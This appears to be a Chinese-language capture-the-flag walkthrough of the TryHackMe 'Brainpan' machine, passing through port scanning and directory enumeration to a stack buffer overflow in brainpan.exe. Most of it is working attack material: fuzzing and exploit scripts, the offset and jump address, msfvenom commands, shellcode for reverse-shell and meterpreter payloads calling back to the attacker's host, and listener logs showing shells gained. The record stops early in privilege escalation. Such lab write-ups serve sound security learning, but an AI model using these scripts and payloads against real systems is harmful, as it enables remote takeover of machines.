# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。



# 服务探测
```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# nmap -sV -Pn 10.10.248.211
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-24 22:51 EST
Nmap scan report for 10.10.248.211
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=11/24%Time=619F086F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.55 seconds

```

可以看到只开了一个http服务和一个未知的9999端口服务

## 目录爆破

```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# gobuster dir -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.248.211:10000/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.248.211:10000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/24 22:55:37 Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 0] [--> /bin/]

```

有一个```/bin```目录，把里面的```brainpan.exe```下载到本地windows机器打开，发现开了一个9999端口的服务，由此可见靶机上的9999端口服务跑的也是这个程序。

# 缓冲区溢出验证

## FUZZING

由于缓冲区溢出需要反复测试，我们需要在本地另外准备一台windows靶机。这边预备了一台win7主机，内网IP是```192.168.3.49```,预装了```Immunity Debugger```调试软件
我们用以下fuzzy.py代码开始fuzzing
```
#!/usr/bin/env python3
import socket, time, sys

ip = "192.168.3.49"

port = 9999
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```
可以看见，在发送600个字节时靶机程序崩溃
![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/Brainpan1.png)

## 计算EIP位置
此时我们生成一段不重复字节，我们在这里选择600个字节，执行：
> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

```

准备好我们的第二个脚本exploit.py，把上面生成的字节码copy到变量payload中：

```
#coding=utf-8
#!/usr/bin/python

#这里主要是为了定位EIP的内存地址
import socket

ip = "192.168.3.49"
port = 9999

prefix = "OVERFLOW1 "
offset = 0 
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


在Immunity Debugger中重启brainpan.exe程序，然后执行上面的exploit.py

观察Immunity Debugger中EIP的值：72413172

![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/Brainpan2.png)

计算出EIP的偏移量,执行：
> msf-pattern_offset -q 72413172

```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# msf-pattern_offset -q 72413172
[*] Exact match at offset 514

```

得出偏移量值为：```514```

## 查找坏字节

我们在Immunity Debugger中输入：```!mona bytearray -b "\x00"```

0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，在上面我们首先把它排除掉。
我们用下面的bytearray.py脚本生成所有字节码：

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

执行：
```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# python3 bytearray.py                 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

```

此时我们准备第二个攻击脚本exploit2.py，把上面生成的字节码粘贴到payload变量

```
import socket

ip = "192.168.3.49"
port = 9999

prefix = "OVERFLOW1 "
offset = 514
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
同时，我们把偏移量514赋值到offset变量，把"BBBB"赋值到retn变量，重启brainpan.exe，执行上面的脚本

![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/Brainpan3.png)

我们可以查看到EIP的值，此时已经变成了42424242，42在ASCII里就是大写的B，也就是我们上面的exploit.py里面retn的值，此时已证明可以覆盖到EIP。

另外，记住这里ESP的值是：0028F930

我们执行```!mona compare -f C:\mona\brainpan\bytearray.bin -a 0028F930```

![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/Brainpan4.png)

居然没有坏字节，过节了。

但是需要注意，0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，因此在这种情况下，我们可以认为唯一的坏字节是：```\x00```

## 找到可以利用的ESP地址
> !mona jmp -r esp -cpb "\x00"

![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/Brainpan5.png)

有一个可以利用的地址，记录内存地址：```311712F3```

需要注意的是这个地址需要从后面往回写，即:```\xf3\x12\x17\x31```

利用msfvenom ，我们生成攻击的shellcode
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.67 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.67 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xda\xde\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x52\xba\x3d\x6b\xed"
"\x34\x31\x56\x17\x03\x56\x17\x83\xd3\x97\x0f\xc1\xd7\x80\x52"
"\x2a\x27\x51\x33\xa2\xc2\x60\x73\xd0\x87\xd3\x43\x92\xc5\xdf"
"\x28\xf6\xfd\x54\x5c\xdf\xf2\xdd\xeb\x39\x3d\xdd\x40\x79\x5c"
"\x5d\x9b\xae\xbe\x5c\x54\xa3\xbf\x99\x89\x4e\xed\x72\xc5\xfd"
"\x01\xf6\x93\x3d\xaa\x44\x35\x46\x4f\x1c\x34\x67\xde\x16\x6f"
"\xa7\xe1\xfb\x1b\xee\xf9\x18\x21\xb8\x72\xea\xdd\x3b\x52\x22"
"\x1d\x97\x9b\x8a\xec\xe9\xdc\x2d\x0f\x9c\x14\x4e\xb2\xa7\xe3"
"\x2c\x68\x2d\xf7\x97\xfb\x95\xd3\x26\x2f\x43\x90\x25\x84\x07"
"\xfe\x29\x1b\xcb\x75\x55\x90\xea\x59\xdf\xe2\xc8\x7d\xbb\xb1"
"\x71\x24\x61\x17\x8d\x36\xca\xc8\x2b\x3d\xe7\x1d\x46\x1c\x60"
"\xd1\x6b\x9e\x70\x7d\xfb\xed\x42\x22\x57\x79\xef\xab\x71\x7e"
"\x10\x86\xc6\x10\xef\x29\x37\x39\x34\x7d\x67\x51\x9d\xfe\xec"
"\xa1\x22\x2b\xa2\xf1\x8c\x84\x03\xa1\x6c\x75\xec\xab\x62\xaa"
"\x0c\xd4\xa8\xc3\xa7\x2f\x3b\x2c\x9f\x2c\xf8\xc4\xe2\x32\xef"
"\x48\x6a\xd4\x65\x61\x3a\x4f\x12\x18\x67\x1b\x83\xe5\xbd\x66"
"\x83\x6e\x32\x97\x4a\x87\x3f\x8b\x3b\x67\x0a\xf1\xea\x78\xa0"
"\x9d\x71\xea\x2f\x5d\xff\x17\xf8\x0a\xa8\xe6\xf1\xde\x44\x50"
"\xa8\xfc\x94\x04\x93\x44\x43\xf5\x1a\x45\x06\x41\x39\x55\xde"
"\x4a\x05\x01\x8e\x1c\xd3\xff\x68\xf7\x95\xa9\x22\xa4\x7f\x3d"
"\xb2\x86\xbf\x3b\xbb\xc2\x49\xa3\x0a\xbb\x0f\xdc\xa3\x2b\x98"
"\xa5\xd9\xcb\x67\x7c\x5a\xeb\x85\x54\x97\x84\x13\x3d\x1a\xc9"
"\xa3\xe8\x59\xf4\x27\x18\x22\x03\x37\x69\x27\x4f\xff\x82\x55"
"\xc0\x6a\xa4\xca\xe1\xbe";
```

把生成的shellcode放到我们最后一个攻击脚本exploit3.py中

```
import socket

ip = "192.168.3.49"
port = 9999

prefix = "OVERFLOW1 "
offset = 514 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"

padding = "\x90" * 16

buf = ""
buf +="\xda\xde\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x52\xba\x3d\x6b\xed"
buf +="\x34\x31\x56\x17\x03\x56\x17\x83\xd3\x97\x0f\xc1\xd7\x80\x52"
buf +="\x2a\x27\x51\x33\xa2\xc2\x60\x73\xd0\x87\xd3\x43\x92\xc5\xdf"
buf +="\x28\xf6\xfd\x54\x5c\xdf\xf2\xdd\xeb\x39\x3d\xdd\x40\x79\x5c"
buf +="\x5d\x9b\xae\xbe\x5c\x54\xa3\xbf\x99\x89\x4e\xed\x72\xc5\xfd"
buf +="\x01\xf6\x93\x3d\xaa\x44\x35\x46\x4f\x1c\x34\x67\xde\x16\x6f"
buf +="\xa7\xe1\xfb\x1b\xee\xf9\x18\x21\xb8\x72\xea\xdd\x3b\x52\x22"
buf +="\x1d\x97\x9b\x8a\xec\xe9\xdc\x2d\x0f\x9c\x14\x4e\xb2\xa7\xe3"
buf +="\x2c\x68\x2d\xf7\x97\xfb\x95\xd3\x26\x2f\x43\x90\x25\x84\x07"
buf +="\xfe\x29\x1b\xcb\x75\x55\x90\xea\x59\xdf\xe2\xc8\x7d\xbb\xb1"
buf +="\x71\x24\x61\x17\x8d\x36\xca\xc8\x2b\x3d\xe7\x1d\x46\x1c\x60"
buf +="\xd1\x6b\x9e\x70\x7d\xfb\xed\x42\x22\x57\x79\xef\xab\x71\x7e"
buf +="\x10\x86\xc6\x10\xef\x29\x37\x39\x34\x7d\x67\x51\x9d\xfe\xec"
buf +="\xa1\x22\x2b\xa2\xf1\x8c\x84\x03\xa1\x6c\x75\xec\xab\x62\xaa"
buf +="\x0c\xd4\xa8\xc3\xa7\x2f\x3b\x2c\x9f\x2c\xf8\xc4\xe2\x32\xef"
buf +="\x48\x6a\xd4\x65\x61\x3a\x4f\x12\x18\x67\x1b\x83\xe5\xbd\x66"
buf +="\x83\x6e\x32\x97\x4a\x87\x3f\x8b\x3b\x67\x0a\xf1\xea\x78\xa0"
buf +="\x9d\x71\xea\x2f\x5d\xff\x17\xf8\x0a\xa8\xe6\xf1\xde\x44\x50"
buf +="\xa8\xfc\x94\x04\x93\x44\x43\xf5\x1a\x45\x06\x41\x39\x55\xde"
buf +="\x4a\x05\x01\x8e\x1c\xd3\xff\x68\xf7\x95\xa9\x22\xa4\x7f\x3d"
buf +="\xb2\x86\xbf\x3b\xbb\xc2\x49\xa3\x0a\xbb\x0f\xdc\xa3\x2b\x98"
buf +="\xa5\xd9\xcb\x67\x7c\x5a\xeb\x85\x54\x97\x84\x13\x3d\x1a\xc9"
buf +="\xa3\xe8\x59\xf4\x27\x18\x22\x03\x37\x69\x27\x4f\xff\x82\x55"
buf +="\xc0\x6a\xa4\xca\xe1\xbe";


payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

在kali开启一个监听，执行上面代码，收到本地靶机的反弹shell
```
┌──(root💀kali)-[~/tryhackme/Brainpan]
└─# nc -lnvp 4444           
listening on [any] 4444 ...
connect to [192.168.3.67] from (UNKNOWN) [192.168.3.49] 49215
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Users\max\Desktop>whoami
whoami
win-mrft0tavd10\max

C:\Users\max\Desktop>

```

到此为止，我们已经成功验证brainpan.exe存在一个缓冲区溢出漏洞，并且给出了攻击代码。

# 攻击

为了后续渗透提权方便，在攻击远程靶机时，我们的payload换成了meterpreter
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169  LPORT=4444 EXITFUNC=thread -b "\x00" -f c

正式攻击脚本：
```
import socket

ip = "10.10.80.112"
port = 9999

prefix = "OVERFLOW1 "
offset = 514 
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"

padding = "\x90" * 16

buf = ""
buf +="\xbd\xb2\x86\x88\xad\xdb\xd9\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
buf +="\x5e\x31\x68\x15\x03\x68\x15\x83\xe8\xfc\xe2\x47\x7a\x60\x22"
buf +="\xa7\x83\x71\x5d\x2e\x66\x40\x4f\x54\xe2\xf1\x5f\x1f\xa6\xf9"
buf +="\x14\x4d\x53\x33\xd4\x7e\xec\x79\x0c\x0b\x60\x56\x61\xcb\x29"
buf +="\x9a\xe0\xb7\x33\xcf\xc2\x86\xfb\x02\x02\xcf\x4d\x68\xeb\x9d"
buf +="\x1a\x19\xa1\x31\x2e\x5f\x7a\x30\xe0\xeb\xc2\x4a\x85\x2c\xb6"
buf +="\xe6\x84\x7c\x67\x7d\xce\x64\x03\xd9\xef\x95\xc0\x5c\x26\xe1"
buf +="\xda\x17\x88\xf5\xa8\x93\x61\x08\x79\xea\xb5\xa7\x44\xc3\x3b"
buf +="\xb9\x81\xe3\xa3\xcc\xf9\x10\x59\xd7\x39\x6b\x85\x52\xde\xcb"
buf +="\x4e\xc4\x3a\xea\x83\x93\xc9\xe0\x68\xd7\x96\xe4\x6f\x34\xad"
buf +="\x10\xfb\xbb\x62\x91\xbf\x9f\xa6\xfa\x64\x81\xff\xa6\xcb\xbe"
buf +="\xe0\x0e\xb3\x1a\x6a\xbc\xa2\x1b\x93\x3f\xcb\x41\x04\x8c\x06"
buf +="\x7a\xd4\x9a\x11\x09\xe6\x05\x8a\x85\x4a\xce\x14\x51\xda\xd8"
buf +="\xa6\x8d\x64\x88\x58\x2e\x95\x81\x9e\x7a\xc5\xb9\x37\x03\x8e"
buf +="\x39\xb7\xd6\x3b\x33\x2f\xd3\xb6\x56\x06\x8b\xca\x58\x49\x10"
buf +="\x42\xbe\x39\xf8\x04\x6e\xfa\xa8\xe4\xde\x92\xa2\xea\x01\x82"
buf +="\xcc\x20\x2a\x29\x23\x9d\x03\xc6\xda\x84\xdf\x77\x22\x13\x9a"
buf +="\xb8\xa8\x96\x5b\x76\x59\xd2\x4f\x6f\x3e\x1c\x8f\x70\xab\x1c"
buf +="\xe5\x74\x7d\x4a\x91\x76\x58\xbc\x3e\x88\x8f\xbe\x38\x76\x4e"
buf +="\xf7\x33\x41\xc4\xb7\x2b\xae\x08\x38\xab\xf8\x42\x38\xc3\x5c"
buf +="\x37\x6b\xf6\xa2\xe2\x1f\xab\x36\x0d\x76\x18\x90\x65\x74\x47"
buf +="\xd6\x29\x87\xa2\x64\x2d\x77\x31\x43\x96\x10\xc9\xd3\x26\xe1"
buf +="\xa3\xd3\x76\x89\x38\xfb\x79\x79\xc1\xd6\xd1\x11\x48\xb7\x90"
buf +="\x80\x4d\x92\x75\x1d\x4e\x11\xae\xae\x35\x5a\x51\x4f\xca\x72"
buf +="\x36\x4f\xcb\x7a\x48\x73\x1a\x43\x3e\xb2\x9f\xf0\x21\x29\x35"
buf +="\x0d\xca\xf4\xdc\xac\x97\x06\x0b\xf2\xa1\x84\xb9\x8b\x55\x94"
buf +="\xc8\x8e\x12\x12\x21\xe3\x0b\xf7\x45\x50\x2b\xd2";



payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

## 初始shell
```
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.13.21.169
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending stage (175174 bytes) to 10.10.80.112
[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.80.112:47932) at 2021-11-25 03:49:39 -0500

meterpreter > getuid
Server username: brainpan\puck

```


# 提权
我们观察靶机的目录结构，看着像是一台linux的机器，而且我在上面的meterpreter里，不能切换到windows的正常shell
```
meterpreter > pwd
Z:\home\puck
meterpreter > cd /
meterpreter > ls
Listing: Z:\
============

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
40777/rwxrwxrwx   0         dir   2013-03-04 13:02:15 -0500  bin
40777/rwxrwxrwx   0         dir   2013-03-04 11:19:23 -0500  boot
40777/rwxrwxrwx   0         dir   2021-11-25 03:46:35 -0500  etc
40777/rwxrwxrwx   0         dir   2013-03-04 11:49:37 -0500  home
100666/rw-rw-rw-  15084717  fil   2013-03-04 11:18:57 -0500  initrd.img
100666/rw-rw-rw-  15084717  fil   2013-03-04 11:18:57 -0500  initrd.img.old
40777/rwxrwxrwx   0         dir   2013-03-04 13:04:41 -0500  lib
40777/rwxrwxrwx   0         dir   2013-03-04 10:12:09 -0500  lost+found
40777/rwxrwxrwx   0         dir   2013-03-04 10:12:14 -0500  media
40777/rwxrwxrwx   0         dir   2012-10-09 10:59:43 -0400  mnt
40777/rwxrwxrwx   0         dir   2013-03-04 10:13:47 -0500  opt
40777/rwxrwxrwx   0         dir   2013-03-07 23:07:15 -0500  root
40777/rwxrwxrwx   0         dir   2021-11-25 03:46:37 -0500  run
40777/rwxrwxrwx   0         dir   2013-03-04 11:20:14 -0500  sbin
40777/rwxrwxrwx   0         dir   2012-06-11 10:43:21 -0400  selinux
40777/rwxrwxrwx   0         dir   2013-03-04 10:13:47 -0500  srv
40777/rwxrwxrwx   0         dir   2021-11-25 04:44:01 -0500  tmp
40777/rwxrwxrwx   0         dir   2013-03-04 10:13:47 -0500  usr
40777/rwxrwxrwx   0         dir   2019-08-05 16:47:05 -0400  var
100666/rw-rw-rw-  5180432   fil   2013-02-25 14:32:04 -0500  vmlinuz
100666/rw-rw-rw-  5180432   fil   2013-02-25 14:32:04 -0500  vmlinuz.old

meterpreter > sysinfo
Computer        : brainpan
